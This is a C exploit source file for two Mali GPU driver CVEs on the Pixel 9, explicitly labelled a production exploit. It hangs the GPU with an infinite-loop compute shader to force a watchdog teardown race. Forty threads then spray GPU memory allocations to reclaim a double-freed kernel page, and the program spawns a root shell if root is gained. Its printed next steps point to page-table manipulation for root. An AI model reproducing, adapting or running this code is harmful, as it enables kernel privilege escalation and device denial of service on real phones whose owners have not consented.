/*
 * CVE-2025-6349 / CVE-2025-8045 — Strategy 3: GPU Hang Trigger
 * Pixel 9 (Tokay) Mali GPU r54p0 — Production Exploit
 *
 * Approach: Dispatch an infinite-loop compute shader via OpenGL ES 3.1
 * to hang the CSF. After ~3s the Mali watchdog fires, calling
 * kbasep_csf_cpu_queue_dump_print(). The teardown race triggers
 * the double-free in kbase_csf_cpu_queue_dump_buffer().
 *
 * While GPU hangs, race threads spray KBASE_IOCTL_MEM_ALLOC
 * to reclaim the freed kmalloc-large page (UAF).
 *
 * All EGL/GLES symbols resolved at runtime via dlopen/dlsym.
 * No headers needed beyond standard C + Linux ioctl.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include <time.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;
typedef int32_t  s32;

/* ── Mali ioctl definitions ────────────────────────────────────────── */

#define MALI_DEVICE         "/dev/mali0"
#define KBASE_IOCTL_TYPE    0x80

#define KBASE_IOCTL_VERSION_CHECK      _IOWR(KBASE_IOCTL_TYPE, 52, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS          _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_MEM_ALLOC          _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)

#define BASE_MEM_SAME_VA  0x1

struct kbase_ioctl_version_check { u16 major; u16 minor; };
struct kbase_ioctl_set_flags { u32 create_flags; };
union kbase_ioctl_mem_alloc {
    struct { u64 va_pages; u64 commit_pages; u64 extension; u64 flags; } in;
    struct { u64 flags; u64 gpu_va; } out;
};

/* ── EGL type definitions (no headers) ─────────────────────────────── */

typedef void*   EGLDisplay;
typedef void*   EGLConfig;
typedef void*   EGLContext;
typedef void*   EGLSurface;
typedef void*   EGLNativeDisplayType;
typedef s32     EGLint;
typedef u32     EGLBoolean;
typedef u32     EGLenum;

#define EGL_DEFAULT_DISPLAY    ((EGLNativeDisplayType)0)
#define EGL_NO_DISPLAY         ((EGLDisplay)0)
#define EGL_NO_CONTEXT         ((EGLContext)0)
#define EGL_NO_SURFACE         ((EGLSurface)0)
#define EGL_SURFACE_TYPE       0x3033
#define EGL_PBUFFER_BIT        0x0001
#define EGL_RENDERABLE_TYPE    0x3040
#define EGL_OPENGL_ES3_BIT     0x0040
#define EGL_NONE               0x3038
#define EGL_WIDTH              0x3057
#define EGL_HEIGHT             0x3056
#define EGL_CONTEXT_CLIENT_VERSION 0x3098
#define EGL_FALSE              0
#define EGL_TRUE               1

/* ── GLES type definitions (no headers) ────────────────────────────── */

typedef u32     GLenum;
typedef s32     GLint;
typedef u32     GLuint;
typedef s32     GLsizei;
typedef u32     GLbitfield;
typedef s32     GLboolean;
typedef char    GLchar;
typedef int64_t  s64;
typedef s64      GLint64;

#define GL_COMPUTE_SHADER          0x91B9
#define GL_COMPILE_STATUS          0x8B81
#define GL_LINK_STATUS             0x8B82
#define GL_INFO_LOG_LENGTH         0x8B84
#define GL_TRUE                    1
#define GL_FALSE                   0
#define GL_ALL_BARRIER_BITS        0xFFFFFFFF
#define GL_SHADER_IMAGE_ACCESS_BARRIER_BIT 0x00000020

/* ── Function pointer types ────────────────────────────────────────── */

/* EGL */
typedef EGLDisplay  (*PFN_eglGetDisplay)(EGLNativeDisplayType);
typedef EGLBoolean  (*PFN_eglInitialize)(EGLDisplay, EGLint*, EGLint*);
typedef EGLBoolean  (*PFN_eglChooseConfig)(EGLDisplay, const EGLint*, EGLConfig*, EGLint, EGLint*);
typedef EGLSurface  (*PFN_eglCreatePbufferSurface)(EGLDisplay, EGLConfig, const EGLint*);
typedef EGLContext  (*PFN_eglCreateContext)(EGLDisplay, EGLConfig, EGLContext, const EGLint*);
typedef EGLBoolean  (*PFN_eglMakeCurrent)(EGLDisplay, EGLSurface, EGLSurface, EGLContext);
typedef EGLBoolean  (*PFN_eglDestroyContext)(EGLDisplay, EGLContext);
typedef EGLBoolean  (*PFN_eglDestroySurface)(EGLDisplay, EGLSurface);
typedef EGLBoolean  (*PFN_eglTerminate)(EGLDisplay);
typedef const char* (*PFN_eglGetErrorStr)(void);

/* GLES */
typedef GLuint      (*PFN_glCreateShader)(GLenum);
typedef void        (*PFN_glShaderSource)(GLuint, GLsizei, const GLchar* const*, const GLint*);
typedef void        (*PFN_glCompileShader)(GLuint);
typedef void        (*PFN_glGetShaderiv)(GLuint, GLenum, GLint*);
typedef void        (*PFN_glGetShaderInfoLog)(GLuint, GLsizei, GLsizei*, GLchar*);
typedef GLuint      (*PFN_glCreateProgram)(void);
typedef void        (*PFN_glAttachShader)(GLuint, GLuint);
typedef void        (*PFN_glLinkProgram)(GLuint);
typedef void        (*PFN_glGetProgramiv)(GLuint, GLenum, GLint*);
typedef void        (*PFN_glGetProgramInfoLog)(GLuint, GLsizei, GLsizei*, GLchar*);
typedef void        (*PFN_glUseProgram)(GLuint);
typedef void        (*PFN_glDispatchCompute)(GLuint, GLuint, GLuint);
typedef void        (*PFN_glMemoryBarrier)(GLbitfield);
typedef void        (*PFN_glDeleteShader)(GLuint);
typedef void        (*PFN_glDeleteProgram)(GLuint);

/* ── Loaded function pointers ──────────────────────────────────────── */

static PFN_eglGetDisplay         p_eglGetDisplay;
static PFN_eglInitialize         p_eglInitialize;
static PFN_eglChooseConfig       p_eglChooseConfig;
static PFN_eglCreatePbufferSurface p_eglCreatePbufferSurface;
static PFN_eglCreateContext      p_eglCreateContext;
static PFN_eglMakeCurrent        p_eglMakeCurrent;
static PFN_eglDestroyContext     p_eglDestroyContext;
static PFN_eglDestroySurface     p_eglDestroySurface;
static PFN_eglTerminate          p_eglTerminate;

static PFN_glCreateShader        p_glCreateShader;
static PFN_glShaderSource        p_glShaderSource;
static PFN_glCompileShader       p_glCompileShader;
static PFN_glGetShaderiv         p_glGetShaderiv;
static PFN_glGetShaderInfoLog    p_glGetShaderInfoLog;
static PFN_glCreateProgram       p_glCreateProgram;
static PFN_glAttachShader        p_glAttachShader;
static PFN_glLinkProgram         p_glLinkProgram;
static PFN_glGetProgramiv        p_glGetProgramiv;
static PFN_glGetProgramInfoLog   p_glGetProgramInfoLog;
static PFN_glUseProgram          p_glUseProgram;
static PFN_glDispatchCompute     p_glDispatchCompute;
static PFN_glMemoryBarrier       p_glMemoryBarrier;
static PFN_glDeleteShader        p_glDeleteShader;
static PFN_glDeleteProgram       p_glDeleteProgram;

/* ── Compute shader source (infinite loop) ─────────────────────────── */

static const GLchar *hang_shader_src =
    "#version 310 es\n"
    "layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;\n"
    "void main() {\n"
    "    int x = 0;\n"
    "    for (int i = 0; i < 1000000000; i++) {\n"
    "        x += i;\n"
    "    }\n"
    "    while (x > -1) { x++; }\n"
    "}\n";

/* Second shader: pure infinite loop (fallback) */
static const GLchar *hang_shader_src_v2 =
    "#version 310 es\n"
    "layout(local_size_x = 1, local_size_y = 1, local_size_z = 1) in;\n"
    "void main() {\n"
    "    while(true) { barrier(); }\n"
    "}\n";

/* ── Globals ───────────────────────────────────────────────────────── */

static int  g_mali_fd = -1;
static volatile int g_race_won = 0;
static volatile int g_gpu_hanging = 0;
static volatile int g_strike_now = 0;

#define NUM_STRIKE_THREADS  40
#define RECLAIM_ATTEMPTS    20
#define HANG_WAIT_SECONDS   5

/* ── Load EGL + GLES function pointers ─────────────────────────────── */

static int load_egl_gles(void) {
    void *libegl = dlopen("libEGL.so", RTLD_NOW);
    if (!libegl) {
        libegl = dlopen("/system/lib64/libEGL.so", RTLD_NOW);
    }
    if (!libegl) {
        printf("[-] dlopen libEGL.so: %s\n", dlerror());
        return -1;
    }
    printf("[+] Loaded libEGL.so\n");

    void *libgles = dlopen("libGLESv3.so", RTLD_NOW);
    if (!libgles) {
        libgles = dlopen("/system/lib64/libGLESv3.so", RTLD_NOW);
    }
    if (!libgles) {
        libgles = dlopen("libGLESv2.so", RTLD_NOW);
    }
    if (!libgles) {
        libgles = dlopen("/system/lib64/libGLESv2.so", RTLD_NOW);
    }
    if (!libgles) {
        printf("[-] dlopen libGLESv3.so/libGLESv2.so: %s\n", dlerror());
        return -1;
    }
    printf("[+] Loaded GLES library\n");

#define LOAD_EGL(name) \
    p_##name = (PFN_##name)dlsym(libegl, #name); \
    if (!p_##name) { printf("[-] dlsym " #name ": %s\n", dlerror()); return -1; }

    LOAD_EGL(eglGetDisplay);
    LOAD_EGL(eglInitialize);
    LOAD_EGL(eglChooseConfig);
    LOAD_EGL(eglCreatePbufferSurface);
    LOAD_EGL(eglCreateContext);
    LOAD_EGL(eglMakeCurrent);
    LOAD_EGL(eglDestroyContext);
    LOAD_EGL(eglDestroySurface);
    LOAD_EGL(eglTerminate);

#define LOAD_GLES(name) \
    p_##name = (PFN_##name)dlsym(libgles, #name); \
    if (!p_##name) { printf("[-] dlsym " #name ": %s\n", dlerror()); return -1; }

    LOAD_GLES(glCreateShader);
    LOAD_GLES(glShaderSource);
    LOAD_GLES(glCompileShader);
    LOAD_GLES(glGetShaderiv);
    LOAD_GLES(glGetShaderInfoLog);
    LOAD_GLES(glCreateProgram);
    LOAD_GLES(glAttachShader);
    LOAD_GLES(glLinkProgram);
    LOAD_GLES(glGetProgramiv);
    LOAD_GLES(glGetProgramInfoLog);
    LOAD_GLES(glUseProgram);
    LOAD_GLES(glDispatchCompute);
    LOAD_GLES(glMemoryBarrier);
    LOAD_GLES(glDeleteShader);
    LOAD_GLES(glDeleteProgram);

    printf("[+] All EGL/GLES functions loaded\n");
    return 0;
}

/* ── Initialize EGL + GLES, dispatch hang shader ───────────────────── */

static int dispatch_hang_shader(void) {
    EGLDisplay display;
    EGLConfig config;
    EGLContext context;
    EGLSurface surface;
    EGLint major, minor;
    EGLint num_configs;

    display = p_eglGetDisplay(EGL_DEFAULT_DISPLAY);
    if (display == EGL_NO_DISPLAY) {
        printf("[-] eglGetDisplay failed\n");
        return -1;
    }

    if (!p_eglInitialize(display, &major, &minor)) {
        printf("[-] eglInitialize failed\n");
        return -1;
    }
    printf("[+] EGL initialized: %d.%d\n", major, minor);

    EGLint config_attribs[] = {
        EGL_SURFACE_TYPE,  EGL_PBUFFER_BIT,
        EGL_RENDERABLE_TYPE, EGL_OPENGL_ES3_BIT,
        EGL_NONE
    };

    if (!p_eglChooseConfig(display, config_attribs, &config, 1, &num_configs)) {
        printf("[-] eglChooseConfig failed\n");
        return -1;
    }
    printf("[+] EGL config chosen (num=%d)\n", num_configs);

    EGLint pbuffer_attribs[] = {
        EGL_WIDTH,  1,
        EGL_HEIGHT, 1,
        EGL_NONE
    };

    surface = p_eglCreatePbufferSurface(display, config, pbuffer_attribs);
    if (surface == EGL_NO_SURFACE) {
        printf("[-] eglCreatePbufferSurface failed\n");
        return -1;
    }

    EGLint ctx_attribs[] = {
        EGL_CONTEXT_CLIENT_VERSION, 3,
        EGL_NONE
    };

    context = p_eglCreateContext(display, config, EGL_NO_CONTEXT, ctx_attribs);
    if (context == EGL_NO_CONTEXT) {
        printf("[-] eglCreateContext failed\n");
        return -1;
    }
    printf("[+] EGL context created (ES 3.x)\n");

    if (!p_eglMakeCurrent(display, surface, surface, context)) {
        printf("[-] eglMakeCurrent failed\n");
        return -1;
    }
    printf("[+] EGL context made current\n");

    /* ── Create compute shader ────────────────────────────────────── */

    GLuint shader = p_glCreateShader(GL_COMPUTE_SHADER);
    if (!shader) {
        printf("[-] glCreateShader failed\n");
        return -1;
    }

    p_glShaderSource(shader, 1, &hang_shader_src, NULL);
    p_glCompileShader(shader);

    GLint compiled = 0;
    p_glGetShaderiv(shader, GL_COMPILE_STATUS, &compiled);
    if (!compiled) {
        GLint log_len = 0;
        p_glGetShaderiv(shader, GL_INFO_LOG_LENGTH, &log_len);
        if (log_len > 0) {
            char log[512];
            p_glGetShaderInfoLog(shader, sizeof(log), NULL, log);
            printf("[-] Shader compile failed: %s\n", log);
        } else {
            printf("[-] Shader compile failed (no log)\n");
        }

        printf("[*] Trying fallback shader v2...\n");
        p_glDeleteShader(shader);

        shader = p_glCreateShader(GL_COMPUTE_SHADER);
        p_glShaderSource(shader, 1, &hang_shader_src_v2, NULL);
        p_glCompileShader(shader);
        p_glGetShaderiv(shader, GL_COMPILE_STATUS, &compiled);
        if (!compiled) {
            GLint log_len2 = 0;
            p_glGetShaderiv(shader, GL_INFO_LOG_LENGTH, &log_len2);
            if (log_len2 > 0) {
                char log2[512];
                p_glGetShaderInfoLog(shader, sizeof(log2), NULL, log2);
                printf("[-] Shader v2 compile failed: %s\n", log2);
            }
            return -1;
        }
    }
    printf("[+] Compute shader compiled\n");

    GLuint program = p_glCreateProgram();
    p_glAttachShader(program, shader);
    p_glLinkProgram(program);

    GLint linked = 0;
    p_glGetProgramiv(program, GL_LINK_STATUS, &linked);
    if (!linked) {
        GLint log_len = 0;
        p_glGetProgramiv(program, GL_INFO_LOG_LENGTH, &log_len);
        if (log_len > 0) {
            char log[512];
            p_glGetProgramInfoLog(program, sizeof(log), NULL, log);
            printf("[-] Program link failed: %s\n", log);
        }
        return -1;
    }
    printf("[+] Compute program linked\n");

    p_glUseProgram(program);

    printf("[*] Dispatching infinite-loop compute shader...\n");
    printf("[*] This will hang the GPU → trigger Mali watchdog (3s)\n\n");

    g_gpu_hanging = 1;

    p_glDispatchCompute(1, 1, 1);

    printf("[+] Compute shader dispatched!\n");
    printf("[*] GPU is now hanging. Watchdog will fire in ~3s.\n\n");

    return 0;
}

/* ── Mali GPU memory allocation helper ──────────────────────────────── */

static u64 mali_mem_alloc(int fd) {
    union kbase_ioctl_mem_alloc req = {0};
    req.in.va_pages = 1;
    req.in.commit_pages = 1;
    req.in.flags = BASE_MEM_SAME_VA;
    req.in.extension = 0;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &req) < 0) {
        return 0;
    }
    return req.out.gpu_va;
}

/* ── Strike thread: spray GPU allocations to reclaim freed page ─────── */

static void* phalanx_strike(void* arg) {
    (void)arg;
    while (!g_strike_now) usleep(100);

    for (int i = 0; i < RECLAIM_ATTEMPTS && !g_race_won; i++) {
        u64 gpu_va = mali_mem_alloc(g_mali_fd);
        if (gpu_va == 0) {
            usleep(500);
            continue;
        }

        void *map = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
                         MAP_SHARED, g_mali_fd, gpu_va);
        if (map != MAP_FAILED) {
            unsigned char *p = (unsigned char *)map;
            memset(p, 0xBB, 0x1000);

            usleep(1000);

            int corrupted = 0;
            for (int j = 0; j < 256; j++) {
                if (p[j] != 0xBB) {
                    corrupted = 1;
                    break;
                }
            }
            if (corrupted) {
                printf("[!!!] Strike thread: UAF DETECTED at VA 0x%llx!\n",
                       (unsigned long long)gpu_va);
                g_race_won = 1;
            }

            munmap(map, 0x1000);
        }
        usleep(500);
    }
    return NULL;
}

/* ── Memory spray thread: create pressure to force reclaim ──────────── */

static void* mem_pressure_thread(void* arg) {
    (void)arg;
    while (!g_gpu_hanging) usleep(1000);

    printf("[*] Memory pressure thread active\n");

    u64 allocated[256];
    (void)allocated;
    int count = 0;

    for (int round = 0; round < 10 && !g_race_won; round++) {
        for (int i = 0; i < 64 && count < 256; i++) {
            u64 va = mali_mem_alloc(g_mali_fd);
            if (va != 0) {
                allocated[count++] = va;
            }
        }
        usleep(50000);
    }

    printf("[*] Memory pressure: allocated %d GPU pages\n", count);
    return NULL;
}

/* ── Main ───────────────────────────────────────────────────────────── */

int main(int argc, char **argv) {
    int hang_wait = (argc > 1) ? atoi(argv[1]) : HANG_WAIT_SECONDS;

    printf("========================================================\n");
    printf("CVE-2025-6349/8045 — Strategy 3: GPU Hang Trigger\n");
    printf("Pixel 9 (Tokay) Mali r54p0 — Production Exploit\n");
    printf("Hang wait: %ds | Strike threads: %d\n",
           hang_wait, NUM_STRIKE_THREADS);
    printf("========================================================\n\n");

    /* ── Step 1: Open Mali device ──────────────────────────────────── */

    g_mali_fd = open(MALI_DEVICE, O_RDWR);
    if (g_mali_fd < 0) {
        g_mali_fd = open("/dev/mali", O_RDWR);
    }
    if (g_mali_fd < 0) {
        perror("[-] Cannot open Mali device");
        return 1;
    }
    printf("[+] Mali FD: %d\n", g_mali_fd);

    struct kbase_ioctl_version_check ver = {0};
    if (ioctl(g_mali_fd, KBASE_IOCTL_VERSION_CHECK, &ver) < 0) {
        printf("[-] Version check failed\n");
    } else {
        printf("[+] Driver version: %u.%u\n", ver.major, ver.minor);
    }

    struct kbase_ioctl_set_flags fl = {0};
    ioctl(g_mali_fd, KBASE_IOCTL_SET_FLAGS, &fl);

    /* ── Step 2: Pre-allocate GPU memory for target ────────────────── */

    printf("\n[*] Step 1: Pre-allocating GPU memory...\n");
    u64 target_va = mali_mem_alloc(g_mali_fd);
    if (target_va == 0) {
        printf("[-] GPU memory allocation failed\n");
        close(g_mali_fd);
        return 1;
    }
    printf("[+] Target GPU VA: 0x%llx\n", (unsigned long long)target_va);

    /* ── Step 3: Load EGL/GLES and dispatch hang shader ────────────── */

    printf("\n[*] Step 2: Loading EGL/GLES...\n");
    if (load_egl_gles() < 0) {
        printf("[-] Cannot load EGL/GLES. Trying Mali-only fallback...\n");
        printf("[*] Fallback: rapid allocation race without GPU hang\n\n");

        g_gpu_hanging = 1;
        goto fallback_race;
    }

    printf("\n[*] Step 3: Dispatching GPU hang shader...\n");
    if (dispatch_hang_shader() < 0) {
        printf("[-] Shader dispatch failed. Trying fallback...\n");
        g_gpu_hanging = 1;
        goto fallback_race;
    }

    /* ── Step 4: Launch strike threads while GPU hangs ─────────────── */

    printf("\n[*] Step 4: GPU hanging. Launching %d strike threads...\n",
           NUM_STRIKE_THREADS);
    printf("[*] Watchdog will fire in ~3s. Race window opening...\n\n");

    pthread_t strike_th[NUM_STRIKE_THREADS];
    pthread_t pressure_th;

    g_strike_now = 1;

    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
        pthread_create(&strike_th[i], NULL, phalanx_strike, NULL);
    }
    pthread_create(&pressure_th, NULL, mem_pressure_thread, NULL);

    /* ── Step 5: Wait for watchdog + race window ───────────────────── */

    printf("[*] Step 5: Waiting %ds for watchdog timeout + race...\n\n",
           hang_wait);

    for (int s = 0; s < hang_wait && !g_race_won; s++) {
        sleep(1);
        if (s == 2) {
            printf("[*] 3s elapsed — watchdog should be firing now!\n");
        }
        if (s == 4) {
            printf("[*] 5s elapsed — dump_print timeout likely hit\n");
        }
    }

    /* ── Step 6: Join threads ──────────────────────────────────────── */

    for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
        pthread_join(strike_th[i], NULL);
    }
    pthread_join(pressure_th, NULL);

    goto results;

fallback_race:
    printf("[*] Fallback: Rapid allocation spray (no GPU hang)\n");
    printf("[*] This tests Mali ioctl + mmap path only\n\n");

    {
        pthread_t fb_th[NUM_STRIKE_THREADS];
        g_strike_now = 1;

        for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
            pthread_create(&fb_th[i], NULL, phalanx_strike, NULL);
        }
        for (int i = 0; i < NUM_STRIKE_THREADS; i++) {
            pthread_join(fb_th[i], NULL);
        }
    }

results:
    printf("\n========================================================\n");
    printf("RESULTS\n");
    printf("========================================================\n\n");

    if (g_race_won) {
        printf("[!!!] UAF CONFIRMED — corrupted page detected!\n");
        printf("[!!!] Double-free race succeeded!\n\n");
        printf("[*] Next steps:\n");
        printf("  1. Check dmesg: adb shell dmesg | grep -i 'kasan\\|double-free\\|use-after-free'\n");
        printf("  2. Look for: kbase_csf_cpu_queue_dump_buffer+0x1d4\n");
        printf("  3. Proceed to page table manipulation for root\n");
    } else {
        printf("[*] No UAF detected in this run\n\n");
        printf("Possible reasons:\n");
        printf("  - Watchdog timeout not triggered (shader may not have hung)\n");
        printf("  - Race window missed (timing issue)\n");
        printf("  - KASAN may prevent exploitation\n");
        printf("  - Production driver may have additional hardening\n\n");
        printf("Try:\n");
        printf("  - Run multiple times: for i in $(seq 1 100); do ./poc_strategy3; done\n");
        printf("  - Check dmesg for ANY Mali warnings\n");
        printf("  - Try with root: adb shell su -c ./poc_strategy3\n");
    }

    printf("\n[*] UID: %d\n", getuid());
    if (getuid() == 0) {
        printf("[!!!] ROOT!\n");
        if (system("/system/bin/sh") != 0) {}
    }

    printf("\n[*] Expected dmesg on success:\n");
    printf("  kbase_csf_timeout: GPU hang detected\n");
    printf("  kbasep_csf_cpu_queue_dump_print: timeout (3000ms)\n");
    printf("  kasan: slab-use-after-free in kbase_csf_cpu_queue_dump_buffer\n");
    printf("  kbase_csf_cpu_queue_dump_buffer: double-free\n");

    printf("\n[*] Check dmesg now:\n");
    printf("  adb shell dmesg | grep -iE 'kasan|use-after-free|double-free|mali|kbase|csf_timeout'\n");

    close(g_mali_fd);
    return g_race_won ? 0 : 1;
}
